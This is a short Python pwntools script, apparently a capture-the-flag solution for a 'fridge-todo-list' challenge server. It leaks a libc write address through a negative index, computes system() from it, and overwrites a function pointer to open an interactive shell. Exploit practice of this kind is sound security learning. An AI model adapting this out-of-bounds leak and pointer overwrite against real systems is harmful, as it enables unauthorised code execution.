from pwn import *
import binascii
import struct


def readall(conn):
    while True:
        line = conn.readline(timeout=2)
        if not line:
            break
        print line,

def writeall(conn, data):
    print data
    conn.sendline(data)

def talk(conn, data):
    writeall(conn, data)
    readall(conn)

conn = remote('fridge-todo-list.ctfcompetition.com', 1337)
readall(conn)
talk(conn, 'hello')
talk(conn, '2')
conn.sendline('-6')
write_func_addr = struct.unpack('<Q', conn.readline().split(':')[-1][1:].ljust(8, '\x00'))[0]
print 'Write func: %08X' % (write_func_addr)
readall(conn)
system_func_addr = write_func_addr + 0x30
talk(conn, '3')
talk(conn, '-4')
conn.sendline('0'*8 + struct.pack('<Q', system_func_addr))
conn.interactive()
#talk(conn, addr)
#talk(conn, '/bin/sh')
#conn.interactive()